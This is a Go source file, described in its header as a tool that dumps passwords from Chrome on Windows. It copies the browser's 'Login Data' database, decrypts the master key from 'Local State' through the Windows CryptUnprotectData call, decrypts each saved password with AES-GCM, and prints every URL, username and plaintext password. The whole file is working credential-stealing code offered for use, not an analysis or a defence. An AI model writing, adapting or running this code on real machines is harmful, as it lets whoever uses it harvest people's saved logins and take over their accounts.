/*
* Description: Dumps passwords from Chrome.
* Platform: Windows
* Requirements: GCC(32-bit and 64-bit)
* Author: Kaiken (Ahmet Eren BOYACI)
 */

package main

import "C"
import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"io/ioutil"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

func main() {
	extractPasswords()
}

func extractPasswords() {
	masterKey := getMasterKey()
	f, _ := ioutil.TempFile("", "Temp.db")
	dbPath := getUserProfilePath()
	dbPath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	dbFile, _ := os.Open(dbPath)
	_, _ = io.Copy(f, dbFile)
	db, _ := sql.Open("sqlite3", f.Name())
	_ = dbFile.Close()

	var (
		actionUrl string
		username  string
		password  string
	)

	decrypedPassword := ""

	printStars()
	row, _ := db.Query("SELECT action_url, username_value, password_value FROM logins;")
	for row.Next() {
		_ = row.Scan(&actionUrl, &username, &password)
		decrypedPassword = decryptAes([]byte(password), masterKey) // v80+

		if len(password) == 0 { // v80 and before
			decryptedPasswordBytes, _ := decrypt([]byte(password))
			decrypedPassword = string(decryptedPasswordBytes)
		}

		if len(actionUrl) > 0 && (len(username) > 0 || len(password) > 0) {
			fmt.Printf("URL: %s\nUsername: %s\nPassword: %s\n", actionUrl, username, decrypedPassword)
			printStars()
		}
	}

	_ = f.Close()
	_ = os.Remove(f.Name())
}

func printStars() {
	for i := 0; i < 50; i++ {
		fmt.Print("*")
	}
	fmt.Println()
}

func decryptAes(buff []byte, masterKey []byte) string {
	iv := buff[3:15]
	payload := buff[15:]
	block, _ := aes.NewCipher(masterKey)
	gcm, _ := cipher.NewGCM(block)
	result, _ := gcm.Open(nil, iv, payload, nil)

	return string(result)
}

func getUserProfilePath() string {
	paths := os.Environ()
	path := ""

	for _, p := range paths {
		if strings.Contains(p, "USERPROFILE") {
			path += strings.Split(p, "=")[1]
			break
		}
	}

	return path
}

func getMasterKey() []byte {
	path := getUserProfilePath()
	path += "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	file, err := os.Open(path)

	if err != nil {
		fmt.Printf("[ERROR] Cannot read master key!\n\t%s\n", err.Error())
		os.Exit(1)
	}

	reader := bufio.NewReader(file)
	jsonContent, _ := reader.ReadString(byte('\n'))
	_ = file.Close()

	var obj map[string]json.RawMessage
	_ = json.Unmarshal([]byte(jsonContent), &obj)

	osCrypt := obj["os_crypt"]
	_ = json.Unmarshal(osCrypt, &obj)
	b64 := obj["encrypted_key"]
	b64String := strings.ReplaceAll(string(b64), "\"", "")
	encryptedKey, _ := base64.StdEncoding.DecodeString(b64String)
	encryptedKey = encryptedKey[5:]
	decryptedKey, _ := decrypt(encryptedKey)

	return decryptedKey
}

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}
